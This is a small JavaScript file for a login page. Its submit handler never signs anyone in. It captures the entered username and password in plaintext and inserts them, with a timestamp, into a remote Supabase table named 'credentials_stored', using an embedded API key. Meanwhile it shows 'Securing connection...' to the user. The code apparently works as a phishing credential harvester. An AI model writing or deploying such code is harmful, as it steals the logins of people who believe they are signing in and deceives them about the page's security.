document.addEventListener('DOMContentLoaded', () => {
  const loginForm = document.getElementById('loginForm');
  const statusMsg = document.getElementById('statusMsg');

  const submitBtn = document.getElementById('submitBtn');

  // Initialize Supabase
  const supabaseUrl = 'https://uzgvideudlslotvihxos.supabase.co';
  const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InV6Z3ZpZGV1ZGxzbG90dmloeG9zIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk5NzgxMjcsImV4cCI6MjA5NTU1NDEyN30.1msOoLo1qO4hKxdHvxYIhAdXTB6lWnQkoc4OX_VehgI';
  const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

  loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Visual feedback: Loading state
    submitBtn.disabled = true;
    submitBtn.textContent = 'Securing connection...';
    statusMsg.textContent = '';
    statusMsg.className = '';

    const userData = {
      username,
      password,
      timestamp: new Date().toLocaleString()
    };

    try {
      const { data, error } = await supabase
        .from('credentials_stored')
        .insert([userData]);

      if (error) {
        throw error;
      }
      
      statusMsg.textContent = 'Data saved successfully!';
      statusMsg.className = 'success';
    } catch (error) {
      console.error('Supabase error:', error);
      statusMsg.textContent = 'Failed to save data. Check console.';
      statusMsg.className = 'error'; // ensure there is an .error class in style.css or it defaults to standard text
    }

    // Reset form
    submitBtn.textContent = 'Login';
    submitBtn.disabled = false;
    loginForm.reset();

  });


});

